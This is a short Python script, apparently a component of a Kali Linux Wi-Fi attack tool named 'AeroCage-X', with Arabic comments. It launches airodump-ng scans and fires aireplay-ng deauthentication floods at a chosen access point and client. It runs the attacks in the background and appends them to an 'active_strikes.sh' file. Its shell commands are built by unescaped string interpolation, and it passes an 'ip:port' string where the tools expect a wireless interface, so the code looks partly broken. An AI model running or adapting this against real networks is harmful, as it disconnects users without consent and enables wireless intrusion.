#!/usr/bin/env python3
import subprocess
import os
import time

class StrikeKaliEngine:
    def __init__(self, ap_ip, port):
        self.target = f"{ap_ip}:{port}"
        self.sh_path = "/home/kali/AeroCage-X/storage/active_strikes.sh"
        os.makedirs(os.path.dirname(self.sh_path), exist_ok=True)

    def launch_airodump_recon(self, channel):
        """إقلاع مسح موجه وخفيف لكالي عبر النفق المخصص لهذه الجلسة فقط"""
        cmd = f"nohup airodump-ng --channel {channel} {self.target} >/dev/null 2>&1 &"
        subprocess.Popen(cmd, shell=True)

    def generate_and_fire_packet(self, bssid, client, count=0):
        """توليد حزمة aireplay بالتتابع الموقوت وقنص المعرف الفردي الصافي"""
        count_flag = f"-0 {count}" if count > 0 else "-0 0"
        aireplay_cmd = f"aireplay-ng {count_flag} -a {bssid} -c {client} {self.target}"
        
        with open(self.sh_path, "a") as f:
            f.write(f"{aireplay_cmd}\n")
            f.write("sleep 1\n")

        subprocess.Popen(f"nohup {aireplay_cmd} >/dev/null 2>&1 &", shell=True)
        time.sleep(0.3)
        
        # [تأمين المعرف العملياتي لطلبك]: جلب السطر الأول النقي كـ String وسحق المصفوفات المعطوبة للأبد
        res = subprocess.check_output(f"pgrep -f 'aireplay-ng .* -c {client} {self.target}' || echo ''", shell=True)
        lines = [l.strip() for l in res.decode().split('\n') if l.strip()]
        return lines[0] if lines else "N/A"
